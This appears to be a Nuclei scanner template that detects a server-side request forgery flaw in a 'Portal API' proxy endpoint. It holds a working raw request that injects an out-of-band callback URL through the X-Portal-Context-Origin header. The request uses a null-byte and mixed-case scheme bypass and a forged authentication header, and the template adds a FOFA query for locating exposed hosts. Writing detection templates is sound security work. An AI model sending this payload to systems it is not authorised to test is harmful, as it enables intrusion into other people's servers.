http:
- extractors:
  - name: interaction_id
    part: interactsh
    regex:
    - '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol, "http")
    - contains(interactsh_request, "/api/v3/portal")
    type: dsl
  raw:
  - 'GET /_proxy/api/v3/portal HTTP/1.1

    Host: {{Hostname}}

    X-Portal-Context-Origin: HttP://{{interactsh-url}}?%00

    X-Portal-Session-Authenticated: true

    '
id: portal-api-ssrf
info:
  author: ishowtess
  description: 'A Server-Side Request Forgery (SSRF) vulnerability in the Portal API
    endpoint by injecting a crafted X-Portal-Context-Origin header.

    '
  metadata:
    fofa-query: body="/_proxy/api/v3/"
    max-request: 1
    verified: true
  name: Portal API - Server Side Request Forgery
  reference:
  - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
  severity: high
  tags: ssrf,api,portal,http,vuln
